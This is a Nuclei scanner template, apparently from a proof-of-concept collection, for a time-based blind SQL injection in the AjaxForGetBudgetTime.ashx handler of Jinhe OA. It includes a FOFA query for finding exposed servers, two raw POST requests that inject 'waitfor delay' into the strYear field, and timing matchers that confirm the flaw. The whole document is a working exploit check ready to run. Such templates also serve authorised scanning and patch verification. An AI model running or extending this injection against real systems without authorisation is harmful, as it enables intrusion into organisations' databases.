id: jinhe-oa-ajaxforgetbudgettime-sqli
info:
  name: 金和OA系统AjaxForGetBudgetTime.ashx接口SQL注入漏洞
  author: 0dayPoc
  severity: high
  description: |-
    fofa: app="金和网络-金和OA"
  tags: 金和OA
http:
- raw:
  - |
    POST /c6/JHSoft.Web.CostControl/BudgetExecution/Handlers/AjaxForGetBudgetTime.ashx HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/x-www-form-urlencoded

    strType=getTime&strTime=&strYear=1'waitfor+delay+'0:0:5'--+
  - |
    POST /c6/JHSoft.Web.CostControl/BudgetExecution/Handlers/AjaxForGetBudgetTime.ashx HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/x-www-form-urlencoded

    strType=getTime&strTime=&strYear=1'waitfor+delay+'0:0:8'--+
  matchers:
  - type: dsl
    dsl:
    - duration_1>=5 && duration_1<=6
    - duration_2>=8 && duration_2<=9
    condition: and
